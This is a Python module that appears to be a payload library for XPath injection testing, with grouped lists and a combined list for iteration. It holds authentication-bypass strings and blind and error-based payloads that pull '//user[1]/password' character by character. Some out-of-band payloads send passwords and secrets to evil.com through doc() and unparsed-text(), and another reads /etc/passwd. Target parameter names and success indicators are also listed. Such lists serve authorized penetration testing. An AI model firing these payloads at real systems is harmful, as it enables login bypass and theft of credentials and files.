"""
XPath Injection Payloads

Payloads for XPath injection attacks including:
- Authentication bypass
- XML traversal
- Blind XPath injection
- Logical operators
"""

# Basic XPath injection payloads
XPATH_INJECTION_BASIC = [
    {
        "name": "or_equals_1",
        "payload": "' or '1'='1",
        "description": "OR 1=1 bypass",
    },
    {
        "name": "or_equals_2",
        "payload": "' or '1'='2",
        "description": "OR 1=2 bypass",
    },
    {
        "name": "or_string",
        "payload": "' or ''='",
        "description": "OR string bypass",
    },
    {
        "name": "or_1",
        "payload": "' or 1=1",
        "description": "OR numeric bypass",
    },
    {
        "name": "and_equals",
        "payload": "' and '1'='1",
        "description": "AND injection",
    },
]

# XPath authentication bypass
XPATH_AUTH_BYPASS = [
    {
        "name": "admin_or",
        "payload": "admin' or ''='",
        "description": "Admin account OR bypass",
    },
    {
        "name": "admin_or_1",
        "payload": "admin' or 1=1",
        "description": "Admin OR 1=1 bypass",
    },
    {
        "name": "wildcard_or",
        "payload": "*' or ''='",
        "description": "Wildcard OR bypass",
    },
    {
        "name": "any_wildcard",
        "payload": "'*[1]='1'",
        "description": "Any wildcard bypass",
    },
]

# XPath comment-based payloads
XPATH_COMMENT = [
    {
        "name": "comment_end",
        "payload": "admin'--",
        "description": "XPath comment end",
    },
    {
        "name": "comment_or",
        "payload": "' or '1'='1'--",
        "description": "Comment after OR",
    },
    {
        "name": "comment_and",
        "payload": "' and '1'='1'--",
        "description": "Comment after AND",
    },
]

# XPath string-length based
XPATH_STRING_LENGTH = [
    {
        "name": "length_gt_0",
        "payload": "' or string-length('x')>0",
        "description": "String length > 0",
    },
    {
        "name": "length_ge_1",
        "payload": "' or string-length('x')>=1",
        "description": "String length >= 1",
    },
    {
        "name": "length_gt_zero",
        "payload": "' or string-length('')>0",
        "description": "Empty string length check",
    },
]

# XPath substring-based
XPATH_SUBSTRING = [
    {
        "name": "substring_match",
        "payload": "' or substring('admin',1,1)='a'",
        "description": "Substring matching",
    },
    {
        "name": "substring_first",
        "payload": "' or substring(.,1,1)='a'",
        "description": "First character check",
    },
    {
        "name": "starts_with",
        "payload": "' or starts-with(.,'a')='a'",
        "description": "Starts-with function",
    },
    {
        "name": "contains",
        "payload": "' or contains(.,'admin')='a'",
        "description": "Contains function",
    },
]

# Blind XPath injection
XPATH_BLIND = [
    {
        "name": "blind_or_1",
        "payload": "' or 1=1",
        "description": "Blind OR 1=1",
    },
    {
        "name": "blind_and_true",
        "payload": "' and '1'='1",
        "description": "Blind AND true",
    },
    {
        "name": "blind_length",
        "payload": "' or string-length(.)>0",
        "description": "Blind string-length check",
    },
    {
        "name": "blind_count",
        "payload": "' or count(/*)>0",
        "description": "Blind count check",
    },
    {
        "name": "timing_injection",
        "payload": "' or count(/*)=999999",
        "description": "XPath timing attack",
    },
]

# XPath logical operator payloads
XPATH_LOGICAL = [
    {
        "name": "or_or",
        "payload": "' or '' or ''='",
        "description": "OR OR injection",
    },
    {
        "name": "and_and",
        "payload": "' and '' and ''='",
        "description": "AND AND injection",
    },
    {
        "name": "not_equal",
        "payload": "' or not('')=''",
        "description": "NOT function",
    },
]

# XPath node traversal
XPATH_TRAVERSAL = [
    {
        "name": "root_path",
        "payload": "' or /*/*='",
        "description": "XPath root traversal",
    },
    {
        "name": "parent_path",
        "payload": "' or /*/parent/*='",
        "description": "XPath parent node traversal",
    },
    {
        "name": "any_path",
        "payload": "' or /descendant::*='",
        "description": "XPath descendant traversal",
    },
    {
        "name": "child_path",
        "payload": "' or /child::*='",
        "description": "XPath child node",
    },
]

# XPath advanced functions
XPATH_FUNCTIONS = [
    {
        "name": "name_function",
        "payload": "' or name(.,'admin')='admin'",
        "description": "Name function injection",
    },
    {
        "name": "translate_function",
        "payload": "' or translate(.,'abc','ABC')='ABC'",
        "description": "Translate function",
    },
    {
        "name": "concat_function",
        "payload": "' or concat(.,'admin')='admin'",
        "description": "Concat function",
    },
    {
        "name": "number_function",
        "payload": "' or number(.)=0",
        "description": "Number function",
    },
]

# XPath special characters
XPATH_SPECIAL_CHARS = [
    {
        "name": "single_quote",
        "payload": "'",
        "description": "Single quote injection",
    },
    {
        "name": "double_quote",
        "payload": '"',
        "description": "Double quote injection",
    },
    {
        "name": "pipe",
        "payload": "|",
        "description": "Pipe operator",
    },
    {
        "name": "asterisk",
        "payload": "*",
        "description": "Asterisk wildcard",
    },
    {
        "name": "double_pipe",
        "payload": "||",
        "description": "Double pipe bypass",
    },
    {
        "name": "or_and",
        "payload": " or and ",
        "description": "Mixed OR AND operators",
    },
]

# XPath union-based
XPATH_UNION = [
    {
        "name": "union",
        "payload": "' | /* | '",
        "description": "XPath union operator",
    },
    {
        "name": "union_node",
        "payload": "' union /*",
        "description": "XPath union with nodes",
    },
    {
        "name": "union_path",
        "payload": "' union /descendant::*",
        "description": "XPath union with path",
    },
]

# XPath injection points
XPATH_INJECTION_POINTS = [
    "username",
    "password",
    "user",
    "login",
    "email",
    "search",
    "query",
    "name",
    "id",
    "uid",
    "filter",
]

# XPath success indicators
XPATH_SUCCESS_INDICATORS = [
    "Welcome",
    "Dashboard",
    "admin",
    "success",
    "logged in",
    "1=1",
    "true",
    "authenticated",
]

# Common XPath predicates
XPATH_PREDICATES = [
    "[text()]",
    "[node()]",
    "[@*]",
    "[@attribute]",
    "[position()",
    "[last()]",
    "[1]",
    "[0]",
]

# XPath 2.0+ specific functions
XPATH_2_FUNCTIONS = [
    {
        "name": "doc_function",
        "payload": "' or doc('http://evil.com/xxe.xml')='",
        "description": "XPath 2.0 doc() function for XXE",
    },
    {
        "name": "unparsed_text",
        "payload": "' or unparsed-text('file:///etc/passwd')='",
        "description": "XPath 2.0 unparsed-text() for LFI",
    },
    {
        "name": "collection",
        "payload": "' or collection('file:///tmp/')='",
        "description": "XPath 2.0 collection() function",
    },
    {
        "name": "environment_variable",
        "payload": "' or environment-variable('PATH')='",
        "description": "XPath 2.0 environment variable access",
    },
    {
        "name": "matches_function",
        "payload": "' or matches(.,'admin')='",
        "description": "XPath 2.0 regex matches()",
    },
    {
        "name": "replace_function",
        "payload": "' or replace(.,'safe','evil')='",
        "description": "XPath 2.0 replace() function",
    },
    {
        "name": "tokenize_function",
        "payload": "' or tokenize(.,' ')[1]='admin'",
        "description": "XPath 2.0 tokenize() function",
    },
    {
        "name": "lower_case",
        "payload": "' or lower-case(.)='admin'",
        "description": "XPath 2.0 lower-case() function",
    },
]

# Error-based XPath extraction
XPATH_ERROR_BASED = [
    {
        "name": "error_division",
        "payload": "' or 1 div 0='",
        "description": "Division by zero error",
    },
    {
        "name": "error_invalid_cast",
        "payload": "' or number('abc')='",
        "description": "Invalid cast error",
    },
    {
        "name": "error_concat_extract",
        "payload": "' or concat(//user[1]/password,'')='",
        "description": "Error-based data extraction via concat",
    },
    {
        "name": "error_invalid_xpath",
        "payload": "' or ][='",
        "description": "Syntax error for detection",
    },
    {
        "name": "error_invalid_function",
        "payload": "' or nonexistent()='",
        "description": "Invalid function error",
    },
]

# Out-of-band XPath extraction
XPATH_OOB = [
    {
        "name": "oob_doc_http",
        "payload": "' or doc(concat('http://evil.com/?d=',//user[1]/password))='",
        "description": "OOB via doc() HTTP request",
    },
    {
        "name": "oob_doc_ftp",
        "payload": "' or doc(concat('ftp://evil.com/',//secret))='",
        "description": "OOB via doc() FTP request",
    },
    {
        "name": "oob_unparsed_text",
        "payload": "' or unparsed-text(concat('http://evil.com/?',//password))='",
        "description": "OOB via unparsed-text()",
    },
]

# Boolean-based blind XPath extraction
XPATH_BOOLEAN_BLIND = [
    {
        "name": "bool_char_extract",
        "payload": "' or substring(//user[1]/password,1,1)='a",
        "description": "Character-by-character extraction",
    },
    {
        "name": "bool_length_check",
        "payload": "' or string-length(//user[1]/password)>5",
        "description": "Password length check",
    },
    {
        "name": "bool_node_count",
        "payload": "' or count(//user)>10",
        "description": "Node count extraction",
    },
    {
        "name": "bool_contains_check",
        "payload": "' or contains(//user[1]/password,'admin')",
        "description": "Contains check for blind extraction",
    },
    {
        "name": "bool_starts_with",
        "payload": "' or starts-with(//user[1]/password,'pass')",
        "description": "Starts-with blind extraction",
    },
]

# Namespace-aware XPath payloads
XPATH_NAMESPACE = [
    {
        "name": "default_namespace",
        "payload": "' or //*[local-name()='user']='",
        "description": "Bypass namespace with local-name()",
    },
    {
        "name": "namespace_uri",
        "payload": "' or //*[namespace-uri()='http://example.com']='",
        "description": "Namespace URI matching",
    },
    {
        "name": "wildcard_namespace",
        "payload": "' or //*:user='",
        "description": "Wildcard namespace prefix",
    },
]

# XPath axis-based extraction
XPATH_AXIS_EXTRACTION = [
    {
        "name": "following_sibling",
        "payload": "' or following-sibling::*[1]='",
        "description": "Following sibling extraction",
    },
    {
        "name": "preceding_sibling",
        "payload": "' or preceding-sibling::*[1]='",
        "description": "Preceding sibling extraction",
    },
    {
        "name": "ancestor_axis",
        "payload": "' or ancestor::*='",
        "description": "Ancestor axis traversal",
    },
    {
        "name": "descendant_axis",
        "payload": "' or descendant::*='",
        "description": "Descendant axis extraction",
    },
    {
        "name": "self_axis",
        "payload": "' or self::*='",
        "description": "Self axis check",
    },
    {
        "name": "attribute_axis",
        "payload": "' or attribute::*='",
        "description": "Attribute axis extraction",
    },
]

# Schema-aware XPath (XPath 2.0 with XML Schema)
XPATH_SCHEMA = [
    {
        "name": "schema_element",
        "payload": "' or . instance of element(user, xs:string)='",
        "description": "Schema-aware type check",
    },
    {
        "name": "cast_as",
        "payload": "' or . cast as xs:integer='",
        "description": "Schema-aware cast",
    },
    {
        "name": "treat_as",
        "payload": "' or . treat as xs:string='",
        "description": "Schema-aware treat as",
    },
]

# XPath injection via different contexts
XPATH_CONTEXTS = [
    {
        "name": "attribute_context",
        "payload": "']/@password | //*[@id='",
        "description": "Injection in attribute context",
    },
    {
        "name": "text_context",
        "payload": "]/text() | //password/text() | //*[id='",
        "description": "Injection in text context",
    },
    {
        "name": "predicate_context",
        "payload": "] | //user[password='",
        "description": "Injection in predicate context",
    },
    {
        "name": "function_context",
        "payload": "') or contains(//password,'",
        "description": "Injection in function argument",
    },
]

# Combined payload list for easy iteration
ALL_XPATH_PAYLOADS = (
    XPATH_INJECTION_BASIC +
    XPATH_AUTH_BYPASS +
    XPATH_COMMENT +
    XPATH_STRING_LENGTH +
    XPATH_SUBSTRING +
    XPATH_BLIND +
    XPATH_LOGICAL +
    XPATH_TRAVERSAL +
    XPATH_FUNCTIONS +
    XPATH_SPECIAL_CHARS +
    XPATH_UNION +
    XPATH_2_FUNCTIONS +
    XPATH_ERROR_BASED +
    XPATH_OOB +
    XPATH_BOOLEAN_BLIND +
    XPATH_NAMESPACE +
    XPATH_AXIS_EXTRACTION +
    XPATH_SCHEMA +
    XPATH_CONTEXTS
)
